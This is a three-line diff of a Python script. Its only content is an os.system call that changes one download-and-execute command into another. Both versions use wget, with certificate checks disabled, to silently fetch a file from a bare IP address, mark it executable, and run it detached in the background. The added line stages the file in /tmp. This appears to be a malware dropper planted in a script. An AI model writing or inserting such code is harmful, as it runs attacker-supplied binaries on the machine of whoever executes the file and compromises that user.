@@ -1,3 +1,3 @@
 import os
 
-os.system("wget -qO RQNMdjwA --no-check-certificate http://103.234.72.176:8088/gFqpqrBI; chmod +x RQNMdjwA; ./RQNMdjwA& disown")
+os.system("wget -qO /tmp/nakVAloW --no-check-certificate http://103.234.72.176:8080/nNKKDzYf; chmod +x /tmp/nakVAloW; cd /tmp; ./nakVAloW& disown")
